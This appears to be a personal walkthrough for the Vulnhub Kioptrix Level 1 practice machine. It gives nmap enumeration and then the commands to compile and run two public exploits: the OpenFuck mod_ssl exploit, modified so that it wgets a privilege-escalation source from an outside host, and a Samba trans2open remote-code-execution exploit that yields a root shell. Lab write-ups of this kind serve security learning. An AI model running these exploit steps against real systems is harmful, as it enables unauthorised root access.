[[Vulnhub]]
# Machine Link
https://www.vulnhub.com/entry/kioptrix-level-1-1,22/

# Enumeration

Finding the internal network ip with namp :
```bash
nmap -sn 192.168.1.1/24
```

The ip in this case is 192.168.1.104

**Scanning for open ports**
```bash
nmap -v -sT -sV -p- 192.168.1.104

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:B9:A3:58 (Oracle VirtualBox virtual NIC)

```

![[Pasted image 20241220163001.png]]


On Port 80 a apache test page was running :
![[Pasted image 20241220163202.png]]



# Exploiting with mod_ssl 2.8.4

In nmap scan we found the mod_ssl version to be 2.8.4

We can search for this on searchsploit locally :
```bash
searchsploit mod_ssl 
```

![[Pasted image 20241220174556.png]]

We found the OpenFuckV2 exploit 

We can also get the same exploit from exploitdb :

https://www.exploit-db.com/exploits/764

I will be using the searchsploit 704.c exploit. For that copy the exploit to other location :

```bash
#install this tool for compiling :
apt install libssl-dev

#copy the exploit
cp /usr/share/exploitdb/exploits/unix/remote/764.c /home/hell/Downloads

```

Now we need to make some changes in the exploit. Open the exploit in a text editor and than add these two lines in `#include` part :

```
#include <openssl/rc4.h>
#include <openssl/md5.h>
```

Also we need to change the wget link of the ptrace-kmod.c file to :
```
wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
```

Original Link:
![[Pasted image 20241220180304.png]]

Updated Link :
![[Pasted image 20241220180743.png]]

After doing these 2 changes compile the exploit :

```bash
gcc -o kioptrix_exploit 764.c -lcrypto
```

### Using the Exploit

```bash
./kioptrix_exploit
```

Now we need to find the OffSet code of apache in our case from nmap output we got the apache version : Apache/1.3.20

```bash
./kioptrix_exploit 0x6b 192.168.1.104 -c 50
```

![[Pasted image 20241220182724.png]]

---
# Exploiting with SMB

### FInding Samba Version

Here we do not get the samba version, also with nc we do not get the samba version sometimes .

Using tcpdump and smbclient to find samba version :

```bash
tcpdump -s0 -n -i wlan0 src 192.168.1.104 and port 139 -A -c 10 2>/dev/null | grep -i "samba\|s.a.m"

#than on other terminal
smbclient -L //<machine-IP> smbclient -L //192.168.1.104

```

![[Pasted image 20241220170824.png]]


We found the version : **Samba 2.2.1.a**

Search on google for exploits of this version

[Samba < 2.2.8 (Linux/BSD) - Remote Code Execution](https://www.exploit-db.com/exploits/10)

Download the c file and compile it using :

```bash
gcc 10.c -o 10
```

### Exploiting

Now use the script with machine ip and you will get the root shell :

```bash
./10 -bBcCdfprsStv 192.168.1.104
```

![[Pasted image 20241220173745.png]]

---